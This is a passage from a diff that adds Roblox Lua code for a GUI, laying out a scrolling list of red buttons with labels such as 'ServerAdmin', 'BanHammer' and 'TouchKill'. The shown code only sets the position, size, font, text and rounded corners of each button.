+ScreenGui.NeptunionV.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.NeptunionV.Position = UDim2.new(0.521452129, 0, 0.129956231, 0)
+ScreenGui.NeptunionV.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.NeptunionV.Font = Enum.Font.SourceSans
+ScreenGui.NeptunionV.Text = "NeptunionV"
+ScreenGui.NeptunionV.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.NeptunionV.TextSize = 28.000
+
+ScreenGui.UICorner_30.Parent = ScreenGui.NeptunionV
+
+ScreenGui.RbNeptunion.Name = "RbNeptunion"
+ScreenGui.RbNeptunion.Parent = ScreenGui.ScrollingFrame
+ScreenGui.RbNeptunion.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.RbNeptunion.Position = UDim2.new(0.0429042876, 0, 0.159133956, 0)
+ScreenGui.RbNeptunion.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.RbNeptunion.Font = Enum.Font.SourceSans
+ScreenGui.RbNeptunion.Text = "RbNeptunion"
+ScreenGui.RbNeptunion.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.RbNeptunion.TextSize = 27.000
+
+ScreenGui.UICorner_31.Parent = ScreenGui.RbNeptunion
+
+ScreenGui.Wall.Name = "Wall"
+ScreenGui.Wall.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Wall.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Wall.Position = UDim2.new(0.521452129, 0, 0.159133956, 0)
+ScreenGui.Wall.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Wall.Font = Enum.Font.SourceSans
+ScreenGui.Wall.Text = "Wall"
+ScreenGui.Wall.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Wall.TextSize = 40.000
+
+ScreenGui.UICorner_32.Parent = ScreenGui.Wall
+
+ScreenGui.AchromaticGlitcher.Name = "AchromaticGlitcher"
+ScreenGui.AchromaticGlitcher.Parent = ScreenGui.ScrollingFrame
+ScreenGui.AchromaticGlitcher.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.AchromaticGlitcher.Position = UDim2.new(0.0429042876, 0, 0.190080017, 0)
+ScreenGui.AchromaticGlitcher.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.AchromaticGlitcher.Font = Enum.Font.SourceSans
+ScreenGui.AchromaticGlitcher.Text = "AchromaticGlitcher"
+ScreenGui.AchromaticGlitcher.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.AchromaticGlitcher.TextSize = 16.000
+
+ScreenGui.UICorner_33.Parent = ScreenGui.AchromaticGlitcher
+
+ScreenGui.FlamingCube.Name = "FlamingCube"
+ScreenGui.FlamingCube.Parent = ScreenGui.ScrollingFrame
+ScreenGui.FlamingCube.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.FlamingCube.Position = UDim2.new(0.521452129, 0, 0.190080017, 0)
+ScreenGui.FlamingCube.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.FlamingCube.Font = Enum.Font.SourceSans
+ScreenGui.FlamingCube.Text = "FlamingCube"
+ScreenGui.FlamingCube.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.FlamingCube.TextSize = 27.000
+
+ScreenGui.UICorner_34.Parent = ScreenGui.FlamingCube
+
+ScreenGui.Spider.Name = "Spider"
+ScreenGui.Spider.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Spider.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Spider.Position = UDim2.new(0.0429042876, 0, 0.21969983, 0)
+ScreenGui.Spider.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Spider.Font = Enum.Font.SourceSans
+ScreenGui.Spider.Text = "Spider"
+ScreenGui.Spider.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Spider.TextSize = 27.000
+
+ScreenGui.UICorner_35.Parent = ScreenGui.Spider
+
+ScreenGui.Cop.Name = "Cop"
+ScreenGui.Cop.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Cop.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Cop.Position = UDim2.new(0.521452129, 0, 0.21969983, 0)
+ScreenGui.Cop.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Cop.Font = Enum.Font.SourceSans
+ScreenGui.Cop.Text = "Cop"
+ScreenGui.Cop.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Cop.TextSize = 27.000
+
+ScreenGui.UICorner_36.Parent = ScreenGui.Cop
+
+ScreenGui.Chips.Name = "Chips"
+ScreenGui.Chips.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Chips.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Chips.Position = UDim2.new(0.0429042876, 0, 0.251530081, 0)
+ScreenGui.Chips.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Chips.Font = Enum.Font.SourceSans
+ScreenGui.Chips.Text = "Chips"
+ScreenGui.Chips.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Chips.TextSize = 27.000
+
+ScreenGui.UICorner_37.Parent = ScreenGui.Chips
+
+ScreenGui.Joy.Name = "Joy"
+ScreenGui.Joy.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Joy.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Joy.Position = UDim2.new(0.521452129, 0, 0.251530081, 0)
+ScreenGui.Joy.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Joy.Font = Enum.Font.SourceSans
+ScreenGui.Joy.Text = "Joy"
+ScreenGui.Joy.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Joy.TextSize = 27.000
+
+ScreenGui.UICorner_38.Parent = ScreenGui.Joy
+
+ScreenGui.UltimateMemeDance.Name = "UltimateMemeDance"
+ScreenGui.UltimateMemeDance.Parent = ScreenGui.ScrollingFrame
+ScreenGui.UltimateMemeDance.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.UltimateMemeDance.Position = UDim2.new(0.0429042876, 0, 0.284686595, 0)
+ScreenGui.UltimateMemeDance.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.UltimateMemeDance.Font = Enum.Font.SourceSans
+ScreenGui.UltimateMemeDance.Text = "UltimateMemeDance"
+ScreenGui.UltimateMemeDance.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.UltimateMemeDance.TextSize = 16.000
+
+ScreenGui.UICorner_39.Parent = ScreenGui.UltimateMemeDance
+
+ScreenGui.Chill.Name = "Chill"
+ScreenGui.Chill.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Chill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Chill.Position = UDim2.new(0.521452129, 0, 0.284686565, 0)
+ScreenGui.Chill.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Chill.Font = Enum.Font.SourceSans
+ScreenGui.Chill.Text = "Chill"
+ScreenGui.Chill.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Chill.TextSize = 27.000
+
+ScreenGui.UICorner_40.Parent = ScreenGui.Chill
+
+ScreenGui.WallWalk.Name = "WallWalk"
+ScreenGui.WallWalk.Parent = ScreenGui.ScrollingFrame
+ScreenGui.WallWalk.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.WallWalk.Position = UDim2.new(0.0429042876, 0, 0.316516817, 0)
+ScreenGui.WallWalk.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.WallWalk.Font = Enum.Font.SourceSans
+ScreenGui.WallWalk.Text = "WallWalk"
+ScreenGui.WallWalk.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.WallWalk.TextSize = 27.000
+
+ScreenGui.UICorner_41.Parent = ScreenGui.WallWalk
+
+ScreenGui.Grapple.Name = "Grapple"
+ScreenGui.Grapple.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Grapple.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Grapple.Position = UDim2.new(0.521452129, 0, 0.316516817, 0)
+ScreenGui.Grapple.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Grapple.Font = Enum.Font.SourceSans
+ScreenGui.Grapple.Text = "Grapple"
+ScreenGui.Grapple.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Grapple.TextSize = 27.000
+
+ScreenGui.UICorner_42.Parent = ScreenGui.Grapple
+
+ScreenGui.KrystalDance.Name = "KrystalDance"
+ScreenGui.KrystalDance.Parent = ScreenGui.ScrollingFrame
+ScreenGui.KrystalDance.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.KrystalDance.Position = UDim2.new(0.0429042876, 0, 0.349673331, 0)
+ScreenGui.KrystalDance.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.KrystalDance.Font = Enum.Font.SourceSans
+ScreenGui.KrystalDance.Text = "KrystalDance"
+ScreenGui.KrystalDance.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.KrystalDance.TextSize = 27.000
+
+ScreenGui.UICorner_43.Parent = ScreenGui.KrystalDance
+
+ScreenGui.Stand.Name = "Stand"
+ScreenGui.Stand.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Stand.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Stand.Position = UDim2.new(0.521452129, 0, 0.349673331, 0)
+ScreenGui.Stand.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Stand.Font = Enum.Font.SourceSans
+ScreenGui.Stand.Text = "Stand"
+ScreenGui.Stand.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Stand.TextSize = 27.000
+
+ScreenGui.UICorner_44.Parent = ScreenGui.Stand
+
+ScreenGui.ServerAdmin.Name = "ServerAdmin"
+ScreenGui.ServerAdmin.Parent = ScreenGui.ScrollingFrame
+ScreenGui.ServerAdmin.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.ServerAdmin.Position = UDim2.new(0.0429042876, 0, 0.382387757, 0)
+ScreenGui.ServerAdmin.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.ServerAdmin.Font = Enum.Font.SourceSans
+ScreenGui.ServerAdmin.Text = "ServerAdmin"
+ScreenGui.ServerAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.ServerAdmin.TextSize = 27.000
+
+ScreenGui.UICorner_45.Parent = ScreenGui.ServerAdmin
+
+ScreenGui.BanHammer.Name = "BanHammer"
+ScreenGui.BanHammer.Parent = ScreenGui.ScrollingFrame
+ScreenGui.BanHammer.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.BanHammer.Position = UDim2.new(0.521452129, 0, 0.382387757, 0)
+ScreenGui.BanHammer.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.BanHammer.Font = Enum.Font.SourceSans
+ScreenGui.BanHammer.Text = "BanHammer"
+ScreenGui.BanHammer.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.BanHammer.TextSize = 27.000
+
+ScreenGui.UICorner_46.Parent = ScreenGui.BanHammer
+
+ScreenGui.ParkourGod.Name = "ParkourGod"
+ScreenGui.ParkourGod.Parent = ScreenGui.ScrollingFrame
+ScreenGui.ParkourGod.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.ParkourGod.Position = UDim2.new(0.0429042876, 0, 0.416870505, 0)
+ScreenGui.ParkourGod.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.ParkourGod.Font = Enum.Font.SourceSans
+ScreenGui.ParkourGod.Text = "ParkourGod"
+ScreenGui.ParkourGod.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.ParkourGod.TextSize = 27.000
+
+ScreenGui.UICorner_47.Parent = ScreenGui.ParkourGod
+
+ScreenGui.Sniper.Name = "Sniper"
+ScreenGui.Sniper.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Sniper.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Sniper.Position = UDim2.new(0.521452129, 0, 0.416870505, 0)
+ScreenGui.Sniper.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Sniper.Font = Enum.Font.SourceSans
+ScreenGui.Sniper.Text = "Sniper"
+ScreenGui.Sniper.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Sniper.TextSize = 27.000
+
+ScreenGui.UICorner_48.Parent = ScreenGui.Sniper
+
+ScreenGui.Ender.Name = "Ender"
+ScreenGui.Ender.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Ender.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Ender.Position = UDim2.new(0.0429042876, 0, 0.450026989, 0)
+ScreenGui.Ender.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Ender.Font = Enum.Font.SourceSans
+ScreenGui.Ender.Text = "Ender"
+ScreenGui.Ender.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Ender.TextSize = 27.000
+
+ScreenGui.UICorner_49.Parent = ScreenGui.Ender
+
+ScreenGui.VrSword.Name = "VrSword"
+ScreenGui.VrSword.Parent = ScreenGui.ScrollingFrame
+ScreenGui.VrSword.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.VrSword.Position = UDim2.new(0.521452129, 0, 0.450026989, 0)
+ScreenGui.VrSword.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.VrSword.Font = Enum.Font.SourceSans
+ScreenGui.VrSword.Text = "VrSword"
+ScreenGui.VrSword.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.VrSword.TextSize = 27.000
+
+ScreenGui.UICorner_50.Parent = ScreenGui.VrSword
+
+ScreenGui.Caducus.Name = "Caducus"
+ScreenGui.Caducus.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Caducus.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Caducus.Position = UDim2.new(0.0429042876, 0, 0.486720175, 0)
+ScreenGui.Caducus.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Caducus.Font = Enum.Font.SourceSans
+ScreenGui.Caducus.Text = "Caducus"
+ScreenGui.Caducus.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Caducus.TextSize = 27.000
+
+ScreenGui.UICorner_51.Parent = ScreenGui.Caducus
+
+ScreenGui.ElioBlasio.Name = "ElioBlasio"
+ScreenGui.ElioBlasio.Parent = ScreenGui.ScrollingFrame
+ScreenGui.ElioBlasio.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.ElioBlasio.Position = UDim2.new(0.521452129, 0, 0.486720175, 0)
+ScreenGui.ElioBlasio.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.ElioBlasio.Font = Enum.Font.SourceSans
+ScreenGui.ElioBlasio.Text = "ElioBlasio"
+ScreenGui.ElioBlasio.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.ElioBlasio.TextSize = 27.000
+
+ScreenGui.UICorner_52.Parent = ScreenGui.ElioBlasio
+
+ScreenGui.Minigun.Name = "Minigun"
+ScreenGui.Minigun.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Minigun.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Minigun.Position = UDim2.new(0.0429042876, 0, 0.52164501, 0)
+ScreenGui.Minigun.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Minigun.Font = Enum.Font.SourceSans
+ScreenGui.Minigun.Text = "Minigun"
+ScreenGui.Minigun.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Minigun.TextSize = 27.000
+
+ScreenGui.UICorner_53.Parent = ScreenGui.Minigun
+
+ScreenGui.Car.Name = "Car"
+ScreenGui.Car.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Car.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Car.Position = UDim2.new(0.521452129, 0, 0.52164501, 0)
+ScreenGui.Car.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Car.Font = Enum.Font.SourceSans
+ScreenGui.Car.Text = "Car"
+ScreenGui.Car.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Car.TextSize = 27.000
+
+ScreenGui.UICorner_54.Parent = ScreenGui.Car
+
+ScreenGui.Carnage.Name = "Carnage"
+ScreenGui.Carnage.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Carnage.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Carnage.Position = UDim2.new(0.0429042876, 0, 0.554359436, 0)
+ScreenGui.Carnage.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Carnage.Font = Enum.Font.SourceSans
+ScreenGui.Carnage.Text = "Carnage"
+ScreenGui.Carnage.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Carnage.TextSize = 27.000
+
+ScreenGui.UICorner_55.Parent = ScreenGui.Carnage
+
+ScreenGui.SegsDoll.Name = "SegsDoll"
+ScreenGui.SegsDoll.Parent = ScreenGui.ScrollingFrame
+ScreenGui.SegsDoll.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.SegsDoll.Position = UDim2.new(0.521452129, 0, 0.554359436, 0)
+ScreenGui.SegsDoll.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.SegsDoll.Font = Enum.Font.SourceSans
+ScreenGui.SegsDoll.Text = "SegsDoll"
+ScreenGui.SegsDoll.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.SegsDoll.TextSize = 27.000
+
+ScreenGui.UICorner_56.Parent = ScreenGui.SegsDoll
+
+ScreenGui.Memeus.Name = "Memeus"
+ScreenGui.Memeus.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Memeus.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Memeus.Position = UDim2.new(0.0429042876, 0, 0.58751595, 0)
+ScreenGui.Memeus.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Memeus.Font = Enum.Font.SourceSans
+ScreenGui.Memeus.Text = "Memeus"
+ScreenGui.Memeus.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Memeus.TextSize = 27.000
+
+ScreenGui.UICorner_57.Parent = ScreenGui.Memeus
+
+ScreenGui.Pen.Name = "Pen"
+ScreenGui.Pen.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Pen.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Pen.Position = UDim2.new(0.521452129, 0, 0.58751595, 0)
+ScreenGui.Pen.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Pen.Font = Enum.Font.SourceSans
+ScreenGui.Pen.Text = "Pen"
+ScreenGui.Pen.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Pen.TextSize = 27.000
+
+ScreenGui.UICorner_58.Parent = ScreenGui.Pen
+
+ScreenGui.Xester.Name = "Xester"
+ScreenGui.Xester.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Xester.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Xester.Position = UDim2.new(0.0429042876, 0, 0.620672464, 0)
+ScreenGui.Xester.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Xester.Font = Enum.Font.SourceSans
+ScreenGui.Xester.Text = "Xester"
+ScreenGui.Xester.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Xester.TextSize = 27.000
+
+ScreenGui.UICorner_59.Parent = ScreenGui.Xester
+
+ScreenGui.Broomstick.Name = "Broomstick"
+ScreenGui.Broomstick.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Broomstick.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Broomstick.Position = UDim2.new(0.521452129, 0, 0.620672464, 0)
+ScreenGui.Broomstick.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Broomstick.Font = Enum.Font.SourceSans
+ScreenGui.Broomstick.Text = "Broomstick"
+ScreenGui.Broomstick.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Broomstick.TextSize = 27.000
+
+ScreenGui.UICorner_60.Parent = ScreenGui.Broomstick
+
+ScreenGui.Headless.Name = "Headless"
+ScreenGui.Headless.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Headless.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Headless.Position = UDim2.new(0.0429042876, 0, 0.654271066, 0)
+ScreenGui.Headless.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Headless.Font = Enum.Font.SourceSans
+ScreenGui.Headless.Text = "Headless"
+ScreenGui.Headless.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Headless.TextSize = 27.000
+
+ScreenGui.UICorner_61.Parent = ScreenGui.Headless
+
+ScreenGui.HeadHold.Name = "HeadHold"
+ScreenGui.HeadHold.Parent = ScreenGui.ScrollingFrame
+ScreenGui.HeadHold.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.HeadHold.Position = UDim2.new(0.521452129, 0, 0.654271066, 0)
+ScreenGui.HeadHold.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.HeadHold.Font = Enum.Font.SourceSans
+ScreenGui.HeadHold.Text = "HeadHold"
+ScreenGui.HeadHold.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.HeadHold.TextSize = 27.000
+
+ScreenGui.UICorner_62.Parent = ScreenGui.HeadHold
+
+ScreenGui.Goopie.Name = "Goopie"
+ScreenGui.Goopie.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Goopie.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Goopie.Position = UDim2.new(0.0429042876, 0, 0.687869668, 0)
+ScreenGui.Goopie.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Goopie.Font = Enum.Font.SourceSans
+ScreenGui.Goopie.Text = "Goopie"
+ScreenGui.Goopie.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Goopie.TextSize = 27.000
+
+ScreenGui.UICorner_63.Parent = ScreenGui.Goopie
+
+ScreenGui.OrangeJustice.Name = "OrangeJustice"
+ScreenGui.OrangeJustice.Parent = ScreenGui.ScrollingFrame
+ScreenGui.OrangeJustice.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.OrangeJustice.Position = UDim2.new(0.521452129, 0, 0.687869668, 0)
+ScreenGui.OrangeJustice.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.OrangeJustice.Font = Enum.Font.SourceSans
+ScreenGui.OrangeJustice.Text = "OrangeJustice"
+ScreenGui.OrangeJustice.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.OrangeJustice.TextSize = 25.000
+
+ScreenGui.UICorner_64.Parent = ScreenGui.OrangeJustice
+
+ScreenGui.Floss.Name = "Floss"
+ScreenGui.Floss.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Floss.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Floss.Position = UDim2.new(0.0429042876, 0, 0.722794533, 0)
+ScreenGui.Floss.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Floss.Font = Enum.Font.SourceSans
+ScreenGui.Floss.Text = "Floss"
+ScreenGui.Floss.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Floss.TextSize = 25.000
+
+ScreenGui.UICorner_65.Parent = ScreenGui.Floss
+
+ScreenGui.DistractDance.Name = "DistractDance"
+ScreenGui.DistractDance.Parent = ScreenGui.ScrollingFrame
+ScreenGui.DistractDance.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.DistractDance.Position = UDim2.new(0.521452129, 0, 0.722794533, 0)
+ScreenGui.DistractDance.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.DistractDance.Font = Enum.Font.SourceSans
+ScreenGui.DistractDance.Text = "DistractDance"
+ScreenGui.DistractDance.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.DistractDance.TextSize = 25.000
+
+ScreenGui.UICorner_66.Parent = ScreenGui.DistractDance
+
+ScreenGui.RussainKick.Name = "RussainKick"
+ScreenGui.RussainKick.Parent = ScreenGui.ScrollingFrame
+ScreenGui.RussainKick.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.RussainKick.Position = UDim2.new(0.0429042876, 0, 0.75904566, 0)
+ScreenGui.RussainKick.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.RussainKick.Font = Enum.Font.SourceSans
+ScreenGui.RussainKick.Text = "RussainKick"
+ScreenGui.RussainKick.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.RussainKick.TextSize = 25.000
+
+ScreenGui.UICorner_67.Parent = ScreenGui.RussainKick
+
+ScreenGui.InsanityPowers.Name = "InsanityPowers"
+ScreenGui.InsanityPowers.Parent = ScreenGui.ScrollingFrame
+ScreenGui.InsanityPowers.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.InsanityPowers.Position = UDim2.new(0.521452129, 0, 0.75904566, 0)
+ScreenGui.InsanityPowers.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.InsanityPowers.Font = Enum.Font.SourceSans
+ScreenGui.InsanityPowers.Text = "InsanityPowers"
+ScreenGui.InsanityPowers.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.InsanityPowers.TextSize = 22.000
+
+ScreenGui.UICorner_68.Parent = ScreenGui.InsanityPowers
+
+ScreenGui.Zen.Name = "Zen"
+ScreenGui.Zen.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Zen.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Zen.Position = UDim2.new(0.0429042876, 0, 0.793528438, 0)
+ScreenGui.Zen.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Zen.Font = Enum.Font.SourceSans
+ScreenGui.Zen.Text = "Zen"
+ScreenGui.Zen.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Zen.TextSize = 30.000
+
+ScreenGui.UICorner_69.Parent = ScreenGui.Zen
+
+ScreenGui.HellRobotics.Name = "HellRobotics"
+ScreenGui.HellRobotics.Parent = ScreenGui.ScrollingFrame
+ScreenGui.HellRobotics.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.HellRobotics.Position = UDim2.new(0.521452129, 0, 0.793528438, 0)
+ScreenGui.HellRobotics.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.HellRobotics.Font = Enum.Font.SourceSans
+ScreenGui.HellRobotics.Text = "HellRobotics"
+ScreenGui.HellRobotics.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.HellRobotics.TextSize = 28.000
+
+ScreenGui.UICorner_70.Parent = ScreenGui.HellRobotics
+
+ScreenGui.Pillow.Name = "Pillow"
+ScreenGui.Pillow.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Pillow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Pillow.Position = UDim2.new(0.0429042876, 0, 0.827127039, 0)
+ScreenGui.Pillow.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Pillow.Font = Enum.Font.SourceSans
+ScreenGui.Pillow.Text = "Pillow"
+ScreenGui.Pillow.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Pillow.TextSize = 28.000
+
+ScreenGui.UICorner_71.Parent = ScreenGui.Pillow
+
+ScreenGui.Pp.Name = "Pp"
+ScreenGui.Pp.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Pp.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Pp.Position = UDim2.new(0.521452129, 0, 0.827127039, 0)
+ScreenGui.Pp.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Pp.Font = Enum.Font.SourceSans
+ScreenGui.Pp.Text = "Pp"
+ScreenGui.Pp.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Pp.TextSize = 28.000
+
+ScreenGui.UICorner_72.Parent = ScreenGui.Pp
+
+ScreenGui.RainbowKing.Name = "RainbowKing"
+ScreenGui.RainbowKing.Parent = ScreenGui.ScrollingFrame
+ScreenGui.RainbowKing.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.RainbowKing.Position = UDim2.new(0.521452129, 0, 0.852325976, 0)
+ScreenGui.RainbowKing.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.RainbowKing.Font = Enum.Font.SourceSans
+ScreenGui.RainbowKing.Text = "RainbowKing"
+ScreenGui.RainbowKing.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.RainbowKing.TextSize = 25.000
+
+ScreenGui.UICorner_73.Parent = ScreenGui.RainbowKing
+
+ScreenGui.TouchKill.Name = "TouchKill"
+ScreenGui.TouchKill.Parent = ScreenGui.ScrollingFrame
+ScreenGui.TouchKill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.TouchKill.Position = UDim2.new(0.0429042876, 0, 0.852325976, 0)
+ScreenGui.TouchKill.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.TouchKill.Font = Enum.Font.SourceSans
+ScreenGui.TouchKill.Text = "TouchKill"
+ScreenGui.TouchKill.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.TouchKill.TextSize = 25.000
+
+ScreenGui.UICorner_74.Parent = ScreenGui.TouchKill
+
+ScreenGui.TakeTheL.Name = "TakeTheL"
